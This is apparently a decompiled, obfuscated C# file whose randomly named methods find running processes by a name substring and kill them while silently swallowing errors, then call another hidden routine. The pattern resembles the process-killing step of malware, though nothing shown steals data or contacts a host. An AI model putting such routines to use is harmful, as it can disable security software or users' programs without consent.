using System;
using System.Diagnostics;

namespace fTOyYuFiHboGKe;

public sealed class ZlRbBtpoWYuSeHK
{
	public static bool KXCrKAiNhMuZj(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void qQKlQYrWzumXBMPU(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (KXCrKAiNhMuZj(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					bpqMdVmtaEtPaZM.pREEHmuZBxDt();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
